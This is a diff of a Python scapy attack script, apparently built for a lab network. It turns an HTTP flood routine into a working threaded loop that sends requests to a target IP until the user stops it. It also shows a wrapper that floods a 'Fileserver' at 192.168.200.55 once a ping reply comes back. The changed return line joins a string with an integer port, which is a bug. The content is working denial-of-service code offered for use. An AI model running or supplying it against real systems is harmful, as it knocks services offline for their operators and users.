@@ -1,6 +1,6 @@
 from scapy.all import *
 from scapy.layers.inet import IP, UDP, TCP, ICMP
-import ftplib
+from scapy.layers.http import *
 
 
 def attack_to_perform(number):
@@ -160,7 +160,7 @@ def perform_dos_http_on_FS(ip_addr="192.168.200.55"):
     if reply is not None and ICMP in reply:
         print(ip_addr, " Fileserver is online")
         print("Performing HTTP FLOOD attack on ", ip_addr, " ...")
-        return perform_http_flood_attack(ip_addr, 80)
+        return perform_http_flood_attack(ip_addr)
 
     return "Fileserver is unreachable"
 
@@ -389,18 +389,33 @@ def perform_udp_flood_attack(ip_addr=None, port=None):
 
 
 # (14) Code to perform http flood attack
-def perform_http_flood_attack(ip_addr=None, port=None):
+def perform_http_flood_attack(ip_addr=None, port=80):
     if not ip_addr:
         # Get input from the user
-        ip_addr = input("Enter the IP address to scan: ")
+        ip_addr = input("Enter the IP address to attack: ")
 
-    if not port:
-        # Get input from the user
-        port = input("Enter the port to attack: ")
+    # Create a flag to indicate whether to stop the attack
+    stop_flag = threading.Event()
 
-    # packet = IP(src=RandIP(), dst=ip_addr) / TCP(dport=int(port)) / ("X" * RandByte())
+    def send_request():
+        while not stop_flag.is_set():
+            http_request(
+                host=ip_addr, path="/", port=80, display=False, verbose=0
+            )  # if display=True it open our browser
 
-    # send(packet, inter=0.005, loop=1, verbose=0)
+    # Create a thread to send HTTP requests
+    print("Starting HTTP flood attack...")
+    attack_thread = threading.Thread(target=send_request)
+    attack_thread.start()
+
+    # Wait for user input to stop the attack
+    input("Press Enter to stop the attack...")
+
+    # Set the stop flag to stop the attack
+    stop_flag.set()
+
+    # Wait for the attack thread to finish
+    attack_thread.join()
 
     return "HTTP flood attack performed on " + ip_addr + " to port " + port
 
